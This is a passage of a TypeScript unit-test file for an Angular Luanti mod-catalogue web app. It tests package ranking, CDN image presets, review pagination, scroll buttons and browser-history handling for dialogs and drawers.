    const dependentMods = Array.from({ length: 12 }, (_, i) =>
      (pkgService as any).normalizePackage({
        id: `Author${i}/mob_pack_${i}`,
        author: `Author${i}`,
        name: `mob_pack_${i}`,
        title: `Mob Pack ${i + 1}`,
        short_desc: `Adds exciting dragons and monsters #${i + 1} to your world.`,
        type: 'mod',
        tags: ['mobs', 'survival', 'adventure_rpg'],
        dependencies: ['default', 'mobs'],
        downloads: 45000 - i * 1000,
        downloads_today: 85 - i * 3,
        downloads_week: 550 - i * 15,
        dependency_ratio: 0.05,
        score: 4.7
      })
    );

    const catalogList = [mobsApiPkg, ...dependentMods];
    const revDepMap = buildReverseDependencyCountMap(catalogList);
    expect(revDepMap.get('mobs')).toBe(12);

    mobsApiPkg.reverse_dep_count = revDepMap.get('mobs');
    expect(isApiOrLibraryPackage(mobsApiPkg)).toBe(true);
    expect(isPrimarilyDependencyPackage(mobsApiPkg)).toBe(true);
    expect(computeDependencyPrioritizationMultiplier(mobsApiPkg)).toBeLessThanOrEqual(0.2);

    expect(isApiOrLibraryPackage(dependentMods[0])).toBe(false);
    expect(isPrimarilyDependencyPackage(dependentMods[0])).toBe(false);
    expect(computeDependencyPrioritizationMultiplier(dependentMods[0])).toBe(1.0);

    // Seed catalog and verify Top 10, Hero Showcase, and % Match exclude/dampen Mobs Redo API
    (pkgService as any)._packages.set(catalogList);
    (pkgService as any)._serverTop10Today.set([mobsApiPkg, ...dependentMods.slice(0, 9)]);
    (pkgService as any)._serverTop10Week.set([mobsApiPkg, ...dependentMods.slice(0, 9)]);

    const top10Today = pkgService.top10TodayPackages();
    expect(top10Today.length).toBe(10);
    expect(top10Today.some(p => p.id === 'TenPlus1/mobs')).toBe(false);
    expect(pkgService.getTop10Rank(mobsApiPkg)).toBeNull();

    const heroList = pkgService.heroShowcasePackages();
    expect(heroList.some(p => p.id === 'TenPlus1/mobs')).toBe(false);

    const mobsMatchScore = pkgService.getMatchScore(mobsApiPkg);
    const gameplayModMatchScore = pkgService.getMatchScore(dependentMods[0]);
    expect(mobsMatchScore).toBeLessThanOrEqual(79);
    expect(gameplayModMatchScore).toBeGreaterThan(mobsMatchScore);

    // 2. Verify multi-tier tile star rating hydration (needsTileHydration does NOT require contentdb_score > 0)
    const unratedCdbTile = (pkgService as any).normalizePackage({
      id: 'ElCeejo/draconis',
      author: 'ElCeejo',
      name: 'draconis',
      title: 'Draconis',
      type: 'mod',
      source: 'official',
      sources: ['official'],
      thumbnail: 'https://content.luanti.org/thumbnails/1/draconis.png',
      downloads: 164000,
      score: 0,
      contentdb_score: 0
    });
    expect((pkgService as any).needsTileHydration(unratedCdbTile)).toBe(true);

    const checkedZeroReviewTile = (pkgService as any).normalizePackage({
      id: 'SomeAuthor/no_reviews_mod',
      author: 'SomeAuthor',
      name: 'no_reviews_mod',
      title: 'No Reviews Mod',
      type: 'mod',
      source: 'official',
      sources: ['official'],
      thumbnail: 'https://content.luanti.org/thumbnails/1/no_reviews.png',
      downloads: 1200,
      score: 0,
      rating_checked: true
    });
    expect((pkgService as any).needsTileHydration(checkedZeroReviewTile)).toBe(false);

    // 3. Verify Community Reviews pagination (5 per page) and lazy-loading in PackageDetailModalComponent
    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFixture.componentInstance;
    const pkgWith12Reviews = (pkgService as any).normalizePackage({
      id: 'ElCeejo/draconis',
      author: 'ElCeejo',
      name: 'draconis',
      title: 'Draconis',
      type: 'mod',
      source: 'official',
      review_thread_counts: { positive: 10, neutral: 1, negative: 1 },
      score: 4.6
    });
    modalComp.package = pkgWith12Reviews;

    const twelveReviews = Array.from({ length: 12 }, (_, idx) => ({
      id: `rev_${idx + 1}`,
      package_id: 'ElCeejo/draconis',
      source: (idx % 2 === 0 ? 'contentdb' : 'luantihub') as 'contentdb' | 'luantihub',
      rating: 5,
      is_positive: true,
      title: `Review Title #${idx + 1}`,
      comment: `Detailed community review comment number ${idx + 1}`,
      created_at: `2026-10-${String(28 - idx).padStart(2, '0')}T10:00:00Z`,
      author: {
        username: `reviewer_${idx + 1}`,
        display_name: `Reviewer ${idx + 1}`,
        avatar_url: 'logo.svg'
      }
    }));

    modalComp.reviews.set(twelveReviews);
    modalComp.isLoadingReviews.set(false);
    modalFixture.detectChanges();

    expect(modalComp.REVIEWS_PAGE_SIZE).toBe(5);
    expect(modalComp.totalReviewCount()).toBe(12);
    expect(modalComp.totalReviewPages()).toBe(3);
    expect(modalComp.reviewsPage()).toBe(1);
    expect(modalComp.reviewsRangeStart()).toBe(1);
    expect(modalComp.reviewsRangeEnd()).toBe(5);
    expect(modalComp.paginatedReviews().map(r => r.id)).toEqual(['rev_1', 'rev_2', 'rev_3', 'rev_4', 'rev_5']);

    // Navigate to Page 2
    modalComp.nextReviewsPage();
    modalFixture.detectChanges();
    expect(modalComp.reviewsPage()).toBe(2);
    expect(modalComp.reviewsRangeStart()).toBe(6);
    expect(modalComp.reviewsRangeEnd()).toBe(10);
    expect(modalComp.paginatedReviews().map(r => r.id)).toEqual(['rev_6', 'rev_7', 'rev_8', 'rev_9', 'rev_10']);

    // Navigate to Page 3
    modalComp.nextReviewsPage();
    modalFixture.detectChanges();
    expect(modalComp.reviewsPage()).toBe(3);
    expect(modalComp.reviewsRangeStart()).toBe(11);
    expect(modalComp.reviewsRangeEnd()).toBe(12);
    expect(modalComp.paginatedReviews().map(r => r.id)).toEqual(['rev_11', 'rev_12']);

    // Navigate back to Page 2
    modalComp.prevReviewsPage();
    modalFixture.detectChanges();
    expect(modalComp.reviewsPage()).toBe(2);

    const paginationBar = (modalFixture.nativeElement as HTMLElement).querySelector(
      '[data-testid="reviews-pagination-bar"]'
    );
    expect(paginationBar).toBeTruthy();
    expect(paginationBar?.textContent).toContain('2 / 3');
  });

  it('should convert ContentDB images to BunnyCDN transformation presets (tile 500px 3:2, banner 1100px 16:9, gallery 720px 16:9) without hover network fetches', async () => {
    const {
      isContentDbThumbnailUrl,
      sanitizePackageImageUrl,
      selectSharpPackageBanner,
      removeContentDbPngHack,
      toCanonicalContentDbUploadUrl,
      formatContentDbCdnUrl,
      upgradeContentDbThumbnailUrl
    } = await import('./core/config/git-providers.config');
    const pkgService = TestBed.inject(PackageService);

    // 1. ContentDB /thumbnails/ URLs and BunnyCDN transformation presets
    const cdbLevel1 = 'https://content.luanti.org/thumbnails/1/8f7c4f97f4.png';
    const cdbLevel3 = 'https://content.luanti.org/thumbnails/3/8f7c4f97f4.png';
    const cdbDoubleExt = 'https://content.luanti.org/thumbnails/1/1486fdc7a4.jpg.png';
    const cdbUpload = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg';
    const cdbUploadTile = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg?width=500&aspect_ratio=3:2';
    const cdbUploadBanner = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg?width=1100&aspect_ratio=16:9';
    const cdbUploadGallery = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg?width=720&aspect_ratio=16:9';

    expect(removeContentDbPngHack('1486fdc7a4.jpg.png')).toBe('1486fdc7a4.jpg');
    expect(removeContentDbPngHack('1a204531fe.png.png')).toBe('1a204531fe.png');
    expect(toCanonicalContentDbUploadUrl(cdbDoubleExt)).toBe('https://cdn.content.luanti.org/uploads/1486fdc7a4.jpg');
    expect(upgradeContentDbThumbnailUrl(cdbDoubleExt)).toBe('https://cdn.content.luanti.org/uploads/1486fdc7a4.jpg');
    expect(formatContentDbCdnUrl(cdbDoubleExt, 'tile')).toBe(
      'https://cdn.content.luanti.org/uploads/1486fdc7a4.jpg?width=500&aspect_ratio=3:2'
    );
    expect(formatContentDbCdnUrl(cdbUpload, 'tile')).toBe(cdbUploadTile);
    expect(formatContentDbCdnUrl(cdbUpload, 'banner')).toBe(cdbUploadBanner);
    expect(formatContentDbCdnUrl(cdbUpload, 'gallery')).toBe(cdbUploadGallery);
    expect(formatContentDbCdnUrl(cdbUploadBanner, 'original')).toBe(cdbUpload);

    expect(isContentDbThumbnailUrl(cdbLevel1)).toBe(true);
    expect(isContentDbThumbnailUrl(cdbUpload)).toBe(false);
    expect(isContentDbThumbnailUrl(cdbUploadTile)).toBe(false);
    expect(sanitizePackageImageUrl(cdbLevel3)).toBe(cdbLevel1);
    expect(selectSharpPackageBanner(undefined, [cdbUpload], cdbLevel1)).toBe(cdbUploadBanner);

    // 2. normalizePackage upgrades ContentDB thumbnail to 'tile' preset and banner to 'banner' preset
    const mobsAnimal = (pkgService as any).normalizePackage({
      id: 'TenPlus1/mobs_animal',
      author: 'TenPlus1',
      name: 'mobs_animal',
      title: 'Mobs Animal',
      type: 'mod',
      source: 'official',
      sources: ['official'],
      thumbnail: cdbLevel1,
      screenshots: [cdbUpload],
      downloads: 216200,
      score: 4.8
    });
    expect(mobsAnimal.thumbnail).toBe(cdbUploadTile);
    expect(mobsAnimal.banner).toBe(cdbUploadBanner);

    // 3. PackageCardComponent uses 500x333 'tile' preset and does NOT trigger network fetches on hover
    const cardFixture = TestBed.createComponent(PackageCardComponent);
    const cardComp = cardFixture.componentInstance;
    cardComp.package = mobsAnimal;
    cardFixture.detectChanges();

    expect(cardComp.cardBannerUrl).toBe(cdbUploadTile);

    (pkgService as any).hydrationQueue.length = 0;
    const loadDetailsSpy = vi.spyOn(pkgService, 'loadPackageDetails');
    const ensureHydratedSpy = vi.spyOn(pkgService, 'ensurePackageHydrated');

    cardComp.onCardMouseEnter();
    await new Promise(resolve => setTimeout(resolve, 260));
    expect(loadDetailsSpy).not.toHaveBeenCalled();
    expect(ensureHydratedSpy).not.toHaveBeenCalled();
    expect(cardComp.cardBannerUrl).toBe(cdbUploadTile);

    // 4. HeroBillboardComponent uses 1100px 16:9 'banner' preset
    const heroFixture = TestBed.createComponent(HeroBillboardComponent);
    const heroComp = heroFixture.componentInstance;
    expect(heroComp.getSlideBanner(mobsAnimal)).toBe(cdbUploadBanner);
    expect(
      heroComp.getSlideBanner({
        ...mobsAnimal,
        banner: cdbLevel1,
        screenshots: [cdbUpload]
      })
    ).toBe(cdbUploadBanner);

    // 5. PackageDetailModalComponent uses 'banner' for header, 'gallery' for carousel slide, and 'original' for Lightbox
    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFixture.componentInstance;
    modalComp.package = mobsAnimal;
    (pkgService as any)._activePackage.set(mobsAnimal);
    modalFixture.detectChanges();

    expect(modalComp.modalHeaderBannerUrl).toBe(cdbUploadBanner);
    expect(modalComp.getSlideDisplayUrl(cdbUpload)).toBe(cdbUploadGallery);
    expect(modalComp.getLightboxDisplayUrl(cdbUploadBanner)).toBe(cdbUpload);
  });

  it('should render sticky right-hand metadata sidebar and 100vh frosted-glass Back to Top buttons on pages and Package Detail Dialog', () => {
    const pkgService = TestBed.inject(PackageService);
    const appFixture = TestBed.createComponent(App);
    const appComp = appFixture.componentInstance;
    appFixture.detectChanges();

    // 1. Page-level Back to Top button visibility past 100vh
    const pageBackToTopBtn = (appFixture.nativeElement as HTMLElement).querySelector<HTMLButtonElement>(
      '[data-testid="page-back-to-top-btn"]'
    );
    expect(pageBackToTopBtn).toBeTruthy();
    expect(appComp.showPageBackToTop()).toBe(false);
    expect(pageBackToTopBtn?.className).toContain('pointer-events-none');
    expect(pageBackToTopBtn?.className).toContain('opacity-0');
    expect(pageBackToTopBtn?.hasAttribute('aria-hidden')).toBe(false);
    expect((pageBackToTopBtn as any)?.inert).toBe(true);

    // Simulate scrolling past 100vh on page
    const vh = window.innerHeight || 800;
    Object.defineProperty(window, 'scrollY', { value: vh + 120, configurable: true, writable: true });
    appComp.updatePageScrollState();
    appFixture.detectChanges();

    expect(appComp.showPageBackToTop()).toBe(true);
    expect(pageBackToTopBtn?.className).toContain('opacity-60');
    expect(pageBackToTopBtn?.className).toContain('pointer-events-auto');
    expect((pageBackToTopBtn as any)?.inert).toBe(false);

    const windowScrollSpy = vi.spyOn(window, 'scrollTo').mockImplementation(() => {});
    pageBackToTopBtn?.click();
    expect(windowScrollSpy).toHaveBeenCalledWith({ top: 0, behavior: 'smooth' });

    // Opening a modal hides the background page Back to Top button
    const testPkg: LuantiPackage = {
      id: 'Warr1024/nodecoreimproved',
      author: 'Warr1024',
      name: 'nodecoreimproved',
      title: 'NodeCore Improved',
      type: 'txp',
      short_desc: 'Improved textures for NodeCore',
      thumbnail: 'logo.svg',
      score: 5.0,
      downloads: 3200,
      license: 'CC-BY-SA-4.0',
      source: 'official',
      tags: ['16px']
    };
    (pkgService as any)._activePackage.set(testPkg);
    appFixture.detectChanges();
    expect(appComp.showPageBackToTop()).toBe(false);

    // Restore window.scrollY
    Object.defineProperty(window, 'scrollY', { value: 0, configurable: true, writable: true });
    (pkgService as any)._activePackage.set(null);
    appComp.updatePageScrollState();
    windowScrollSpy.mockRestore();

    // 2. Package Detail Modal: Sticky right-hand metadata sidebar + 100vh modal Back to Top button
    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFixture.componentInstance;
    modalComp.package = testPkg;
    (pkgService as any)._activePackage.set(testPkg);
    modalFixture.detectChanges();

    const modalEl = modalFixture.nativeElement as HTMLElement;
    const stickySidebar = modalEl.querySelector<HTMLElement>('[data-testid="modal-sticky-sidebar"]');
    expect(stickySidebar).toBeTruthy();
    expect(stickySidebar?.className).toContain('lg:sticky');
    expect(stickySidebar?.className).toContain('lg:top-6');

    const modalBackToTopBtn = modalEl.querySelector<HTMLButtonElement>('[data-testid="modal-back-to-top-btn"]');
    expect(modalBackToTopBtn).toBeTruthy();
    expect(modalComp.showModalBackToTop()).toBe(false);
    expect(modalBackToTopBtn?.className).toContain('pointer-events-none');

    // Simulate scrolling inside #modalScrollContainer past 100vh (container.clientHeight)
    const scrollContainer = modalComp.modalScrollContainerRef?.nativeElement;
    expect(scrollContainer).toBeTruthy();
    if (scrollContainer) {
      Object.defineProperty(scrollContainer, 'clientHeight', { value: 600, configurable: true });
      scrollContainer.scrollTop = 450;
      modalComp.onModalContainerScroll();
      modalFixture.detectChanges();
      expect(modalComp.showModalBackToTop()).toBe(false);

      scrollContainer.scrollTop = 650;
      modalComp.onModalContainerScroll();
      modalFixture.detectChanges();
      expect(modalComp.showModalBackToTop()).toBe(true);
      expect(modalBackToTopBtn?.className).toContain('opacity-60');
      expect(modalBackToTopBtn?.className).toContain('pointer-events-auto');

      const containerScrollSpy = vi.fn();
      (scrollContainer as any).scrollTo = containerScrollSpy;
      modalBackToTopBtn?.click();
      modalFixture.detectChanges();
      expect(containerScrollSpy).toHaveBeenCalledWith({ top: 0, behavior: 'smooth' });
      expect(modalComp.showModalBackToTop()).toBe(false);
    }
    (pkgService as any)._activePackage.set(null);
  });

  it('should render Recently Added carousel above Trending This Week combining Git and ContentDB packages and support View All sorting by created_at', () => {
    const pkgService = TestBed.inject(PackageService);
    pkgService.resetFilters(true);

    (pkgService as any).applyBootPayload(
      {
        packages: [
          {
            id: 'OldAuthor/legacy_mod',
            author: 'OldAuthor',
            name: 'legacy_mod',
            title: 'Legacy Popular Mod',
            type: 'mod',
            short_desc: 'Popular older mod',
            thumbnail: 'logo.svg',
            downloads: 120000,
            score: 4.9,
            release: 99999,
            created_at: '2023-05-10T00:00:00.000Z',
            updated_at: '2026-11-04T04:00:00.000Z',
            source: 'official'
          },
          {
            id: 'DualAuthor/dual_source_mod',
            author: 'DualAuthor',
            name: 'dual_source_mod',
            title: 'Dual Source Mod',
            type: 'mod',
            short_desc: 'Existing ContentDB mod that also linked a Git repo',
            thumbnail: 'logo.svg',
            downloads: 45000,
            score: 4.9,
            release: 88888,
            created_at: '2026-11-04T04:30:00.000Z',
            source: 'official',
            sources: ['official', 'git']
          },
          {
            id: 'CdbCreator/fresh_cdb_game',
            author: 'CdbCreator',
            name: 'fresh_cdb_game',
            title: 'Fresh ContentDB Game',
            type: 'game',
            short_desc: 'Newly approved ContentDB game',
            thumbnail: 'logo.svg',
            downloads: 240,
            score: 4.8,
            release: 39800,
            source: 'official'
          },
          {
            id: 'GitCreator/brand_new_git_mod',
            author: 'GitCreator',
            name: 'brand_new_git_mod',
            title: 'Brand New Git Mod',
            type: 'mod',
            short_desc: 'Newly submitted Git repository mod',
            thumbnail: 'logo.svg',
            downloads: 45,
            score: 5.0,
            created_at: '2026-11-04T03:00:00.000Z',
            source: 'git',
            sources: ['git']
          }
        ],
        recentlyAdded: [
          {
            id: 'GitCreator/brand_new_git_mod',
            author: 'GitCreator',
            name: 'brand_new_git_mod',
            title: 'Brand New Git Mod',
            type: 'mod',
            short_desc: 'Newly submitted Git repository mod',
            thumbnail: 'logo.svg',
            downloads: 45,
            score: 5.0,
            created_at: '2026-11-04T03:00:00.000Z',
            source: 'git',
            sources: ['git']
          },
          {
            id: 'CdbCreator/fresh_cdb_game',
            author: 'CdbCreator',
            name: 'fresh_cdb_game',
            title: 'Fresh ContentDB Game',
            type: 'game',
            short_desc: 'Newly approved ContentDB game',
            thumbnail: 'logo.svg',
            downloads: 240,
            score: 4.8,
            release: 39800,
            created_at: '2026-11-03T18:00:00.000Z',
            source: 'official'
          }
        ]
      },
      { fromCache: true }
    );

    const recent = pkgService.recentlyAddedPackages();
    expect(recent.map(p => p.id)).toEqual([
      'GitCreator/brand_new_git_mod',
      'CdbCreator/fresh_cdb_game'
    ]);
    expect(recent.some(p => p.id === 'OldAuthor/legacy_mod')).toBe(false);
    expect(recent.some(p => p.id === 'DualAuthor/dual_source_mod')).toBe(false);

    const catalogFixture = TestBed.createComponent(CatalogComponent);
    catalogFixture.detectChanges();
    const catalogEl = catalogFixture.nativeElement as HTMLElement;
    const headings = Array.from(catalogEl.querySelectorAll('app-package-carousel h2')).map(
      el => el.textContent?.trim() || ''
    );
    const recentlyAddedIdx = headings.findIndex(h => h.includes('Recently Added'));
    const trendingIdx = headings.findIndex(h => h.includes('Trending This Week'));
    expect(recentlyAddedIdx).toBeGreaterThanOrEqual(0);
    expect(trendingIdx).toBeGreaterThan(recentlyAddedIdx);

    const firstCarouselSection = catalogEl.querySelector('app-package-carousel section') as HTMLElement | null;
    expect(firstCarouselSection?.style.contentVisibility).toBe('auto');

    const scrollSpy = vi.spyOn(window, 'scrollTo').mockImplementation(() => {});
    pkgService.viewAllRecentlyAdded();
    expect(pkgService.sortBy()).toBe('created');
    expect(pkgService.hasActiveFilters()).toBe(true);
    expect( pkgService.filteredPackages().map(p => p.id).slice(0, 3)).toEqual([
      'GitCreator/brand_new_git_mod',
      'CdbCreator/fresh_cdb_game',
      'OldAuthor/legacy_mod'
    ]);
    scrollSpy.mockRestore();
    pkgService.resetFilters(true);
  });

  it('should maintain deterministic chronological browser history across categories, multiple package detail dialogs, and sidebars/drawers without getting stuck opening/closing dialogs on Back', () => {
    const pkgService = TestBed.inject(PackageService);
    const authService = TestBed.inject(AuthService);
    const pwaService = TestBed.inject(PwaService);
    const router = (pkgService as any).router;

    const pkg1: LuantiPackage = {
      id: 'ElCeejo/draconis',
      author: 'ElCeejo',
      name: 'draconis',
      title: 'Draconis',
      type: 'mod',
      short_desc: 'Dragons mod',
      thumbnail: 'logo.svg',
      score: 4.9,
      downloads: 48000,
      license: 'MIT',
      source: 'official',
      tags: ['mobs']
    };
    const pkg2: LuantiPackage = {
      id: 'Wuzzy/mineclone2',
      author: 'Wuzzy',
      name: 'mineclone2',
      title: 'VoxeLibre',
      type: 'game',
      short_desc: 'Survival sandbox game',
      thumbnail: 'logo.svg',
      score: 4.9,
      downloads: 420000,
      license: 'GPL-3.0-only',
      source: 'official',
      tags: ['survival']
    };
    (pkgService as any)._packages.set([pkg1, pkg2]);

    // Track actual browser history stack entries as pushState / replaceState / back execute
    const historyStack: string[] = ['/'];
    let historyCursor = 0;

    const origPushState = window.history.pushState.bind(window.history);
    const origReplaceState = window.history.replaceState.bind(window.history);

    const pushSpy = vi.spyOn(window.history, 'pushState').mockImplementation(((data: any, unused: string, url?: string | URL | null) => {
      const nextUrl = url ? String(url) : window.location.pathname + window.location.search;
      historyStack.splice(historyCursor + 1);
      historyStack.push(nextUrl);
      historyCursor = historyStack.length - 1;
      (pwaService as any).navHistoryCursor = historyCursor;
      return origReplaceState({ ...(data || {}), __lhNavIdx: historyCursor }, unused, nextUrl);
    }) as any);

    const replaceSpy = vi.spyOn(window.history, 'replaceState').mockImplementation(((data: any, unused: string, url?: string | URL | null) => {
      const nextUrl = url ? String(url) : window.location.pathname + window.location.search;
      historyStack[historyCursor] = nextUrl;
      return origReplaceState({ ...(data || {}), __lhNavIdx: historyCursor }, unused, nextUrl);
    }) as any);

    const stepBack = () => {
      if (historyCursor > 0) {
        historyCursor -= 1;
      }
      (pwaService as any).navHistoryCursor = historyCursor;
      const targetUrl = historyStack[historyCursor];
      origReplaceState({ __lhNavIdx: historyCursor }, '', targetUrl);
      window.dispatchEvent(new PopStateEvent('popstate'));
    };

    const backSpy = vi.spyOn(window.history, 'back').mockImplementation(() => {
      stepBack();
    });

    const navigateSpy = vi.spyOn(router, 'navigate').mockImplementation(((commands: any, extras?: any) => {
      const targetPath = Array.isArray(commands) && commands.length > 0 ? commands.join('/').replace(/^\/\//, '/') : '/';
      const normalizedPath = targetPath.startsWith('/') ? targetPath : `/${targetPath}`;
      const qs = (pkgService as any).buildCanonicalUrlString(normalizedPath, extras?.queryParams || {});
      if (extras?.replaceUrl) {
        window.history.replaceState(window.history.state, '', qs);
      } else {
        window.history.pushState(window.history.state, '', qs);
      }
      return Promise.resolve(true);
    }) as any);

    pkgService.resetFilters(true, true);
    historyStack.length = 0;
    historyStack.push('/');
    historyCursor = 0;
    (pwaService as any).navHistoryCursor = 0;

    // 1. User's exact scenario (dismissing dialogs with X between steps):
    // Home (/) -> Games (/games) -> Open Package Dialog 1 -> Close X -> Open Package Dialog 2 -> Close X -> Mods (/mods) -> Textures (/texture-packs)
    pkgService.selectPrimaryNavTab('game');
    expect(window.location.pathname).toBe('/games');

    // Clicking the already-active tab replaces instead of pushing a duplicate entry
    pkgService.selectPrimaryNavTab('game');
    expect(navigateSpy).toHaveBeenLastCalledWith(['/games'], expect.objectContaining({ replaceUrl: true }));

    pkgService.openPackageModal(pkg1);
    expect(pkgService.activePackage()?.id).toBe('ElCeejo/draconis');
    expect(window.location.pathname).toBe('/package/ElCeejo/draconis');

    // Dismissing Dialog 1 with X replaces URL in-place with /games (replaceUrl: true) and records dismissedOverlayUrl
    pkgService.closePackageModal(true);
    expect(navigateSpy).toHaveBeenLastCalledWith(['/games'], expect.objectContaining({ replaceUrl: true }));
    expect(pkgService.activePackage()).toBeNull();
    expect(window.location.pathname).toBe('/games');

    // Opening Package Dialog 2 restores Package Dialog 1 in historyStack and pushes Package Dialog 2
    pkgService.openPackageModal(pkg2);
    expect(pkgService.activePackage()?.id).toBe('Wuzzy/mineclone2');
    expect(window.location.pathname).toBe('/package/Wuzzy/mineclone2');

    // Dismissing Dialog 2 with X replaces URL in-place with /games
    pkgService.closePackageModal(true);
    expect(pkgService.activePackage()).toBeNull();
    expect(window.location.pathname).toBe('/games');

    // Clicking Mods -> Textures restores Package Dialog 2 in historyStack and pushes /mods -> /texture-packs
    pkgService.selectPrimaryNavTab('mod');
    expect(window.location.pathname).toBe('/mods');
    pkgService.selectPrimaryNavTab('txp');
    expect(window.location.pathname).toBe('/texture-packs');

    expect(historyStack).toEqual([
      '/',
      '/games',
      '/package/ElCeejo/draconis?type=game',
      '/package/Wuzzy/mineclone2?type=game',
      '/mods',
      '/texture-packs'
    ]);

    // Going Back step-by-step: Textures -> Mods -> Package Dialog 2 -> Package Dialog 1 -> Games -> Home
    stepBack();
    expect(window.location.pathname).toBe('/mods');
    expect(pkgService.selectedType()).toBe('mod');
    expect(pkgService.activePackage()).toBeNull();

    stepBack();
    expect(window.location.pathname).toBe('/package/Wuzzy/mineclone2');
    expect(pkgService.activePackage()?.id).toBe('Wuzzy/mineclone2');
    expect(pkgService.selectedType()).toBe('game');

    stepBack();
    expect(window.location.pathname).toBe('/package/ElCeejo/draconis');
    expect(pkgService.activePackage()?.id).toBe('ElCeejo/draconis');
    expect(pkgService.selectedType()).toBe('game');

    stepBack();
    expect(window.location.pathname).toBe('/games');
    expect(pkgService.activePackage()).toBeNull();
    expect(pkgService.selectedType()).toBe('game');

    stepBack();
    expect(window.location.pathname).toBe('/');
    expect(pkgService.activePackage()).toBeNull();
    expect(pkgService.selectedType()).toBe('all');
    expect(pkgService.hasActiveFilters()).toBe(false);

    // 2. Verify NO open/close loop when pressing X on a dialog after navigating Back, and then pressing Back again:
    // Home (/) -> Games (/games) -> Open Package Dialog 1 -> Close X -> Press Back -> lands directly on Home (/) without reopening Dialog 1!
    pkgService.selectPrimaryNavTab('game');
    pkgService.openPackageModal(pkg1);
    expect(pkgService.activePackage()?.id).toBe('ElCeejo/draconis');

    pkgService.closePackageModal(true);
    expect(pkgService.activePackage()).toBeNull();
    expect(window.location.pathname).toBe('/games');

    // Pressing Back after closing Dialog 1 with X skips the duplicate /games entry and lands directly on Home ('/')
    stepBack();
    expect(pkgService.activePackage()).toBeNull();
    expect(window.location.pathname).toBe('/');
    expect(pkgService.selectedType()).toBe('all');

    // 2b. Verify nested sub-overlay X dismissal (Games -> Package Dialog 1 -> Author Drawer -> Close Author X -> Close Package X -> Press Back)
    //     lands directly on Home ('/') without reopening Package Dialog 1 or Author Drawer
    pkgService.selectPrimaryNavTab('game');
    pkgService.openPackageModal(pkg1);
    pkgService.openAuthorDrawer('sakel-hub', true);
    expect(pkgService.activeAuthorUsername()).toBe('sakel-hub');

    pkgService.closeAuthorDrawer(true, true);
    expect(pkgService.activeAuthorUsername()).toBeNull();
    expect(pkgService.activePackage()?.id).toBe('ElCeejo/draconis');

    pkgService.closePackageModal(true);
    expect(pkgService.activePackage()).toBeNull();
    expect(window.location.pathname).toBe('/games');

    stepBack();
    expect(pkgService.activePackage()).toBeNull();
    expect(pkgService.activeAuthorUsername()).toBeNull();
    expect(window.location.pathname).toBe('/');
    expect(pkgService.selectedType()).toBe('all');

    // 3. Sidebar / Drawer history (Profile Drawer tabs + Author Drawer + Package Dialog):
    (authService as any)._currentUser.set({
      id: 'usr_sakel',
      username: 'sakel-hub',
      display_name: 'SaKeL',
      avatar_url: 'logo.svg',
      bio: '',
      role: 'admin',
      is_admin: true,
      identities: [{ provider: 'github', username: 'sakel-hub', verified: true }]
    });

    authService.openProfileDrawer(true);
    expect(authService.isProfileDrawerOpen()).toBe(true);
    expect(authService.activeProfileTab()).toBe('packages');
    expect(window.location.pathname + window.location.search).toBe('/profile');

    authService.selectProfileDrawerTab('account', true);
    expect(authService.activeProfileTab()).toBe('account');
    expect(window.location.pathname + window.location.search).toBe('/profile?tab=account');

    authService.selectProfileDrawerTab('favorites', true);
    expect(authService.activeProfileTab()).toBe('favorites');
    expect(window.location.pathname + window.location.search).toBe('/profile?tab=favorites');

    pkgService.openAuthorDrawer('sakel-hub', true);
    expect(authService.isProfileDrawerOpen()).toBe(false);
    expect(pkgService.activeAuthorUsername()).toBe('sakel-hub');
    expect(window.location.pathname).toBe('/author/sakel-hub');

    pkgService.openPackageFromAuthorDrawer(pkg1, true);
    expect(pkgService.activeAuthorUsername()).toBeNull();
    expect(pkgService.activePackage()?.id).toBe('ElCeejo/draconis');
    expect(window.location.pathname).toBe('/package/ElCeejo/draconis');

    // Step backward through drawers & profile tabs:
    // Package Dialog -> Author Drawer -> Profile (favorites) -> Profile (account) -> Profile (packages) -> Home
    stepBack();
    expect(pkgService.activePackage()).toBeNull();
    expect(pkgService.activeAuthorUsername()).toBe('sakel-hub');
    expect(authService.isProfileDrawerOpen()).toBe(false);

    stepBack();
    expect(pkgService.activeAuthorUsername()).toBeNull();
    expect(authService.isProfileDrawerOpen()).toBe(true);
    expect(authService.activeProfileTab()).toBe('favorites');

    stepBack();
    expect(authService.isProfileDrawerOpen()).toBe(true);
    expect(authService.activeProfileTab()).toBe('account');

    stepBack();
    expect(authService.isProfileDrawerOpen()).toBe(true);
    expect(authService.activeProfileTab()).toBe('packages');

    stepBack();
    expect(authService.isProfileDrawerOpen()).toBe(false);
    expect(window.location.pathname).toBe('/');

    pushSpy.mockRestore();
    replaceSpy.mockRestore();
    backSpy.mockRestore();

    // 4. Direct deep-link entry on /package/:author/:name seeds '/' (Home) in window.history first
    (pwaService as any).navHistoryCursor = 0;
    const replaceStateSpy = vi.spyOn(window.history, 'replaceState');
    const pushStateSpy = vi.spyOn(window.history, 'pushState');
    window.history.replaceState({}, '', '/package/ElCeejo/draconis');
    replaceStateSpy.mockClear();
    pushStateSpy.mockClear();

    pkgService.ensureHomeBaseHistoryForDeepLink('/package/ElCeejo/draconis');
    expect(replaceStateSpy).toHaveBeenCalledWith(
      expect.objectContaining({ __lhNavIdx: 0, __lhSeededBase: true }),
      '',
      '/'
    );
    expect(pushStateSpy).toHaveBeenCalledWith(
      expect.objectContaining({ __lhNavIdx: 1, __lhSeededBase: true }),
      '',
      '/package/ElCeejo/draconis'
    );
    expect((pkgService as any).inAppModalHistoryDepth).toBe(1);

    replaceStateSpy.mockRestore();
    pushStateSpy.mockRestore();
    navigateSpy.mockRestore();
    window.history.replaceState({ __lhNavIdx: 0 }, '', '/');
    pkgService.resetFilters(true, true);

    // 5. Clicking "+ Direct Author / Community Sign-In" in ProfileDrawerComponent while logged in
    //    must open AuthModalComponent with Direct Sign-In expanded (and pre-select unlinked provider)
    (authService as any)._currentUser.set({
      id: 'usr_sakel',
      username: 'sakel-hub',
      display_name: 'SaKeL',
      avatar_url: 'logo.svg',
      bio: '',
      role: 'admin',
      is_admin: true,
      identities: [
        { provider: 'github', username: 'sakel-hub', profile_url: 'https://github.com/sakel-hub', verified: true },
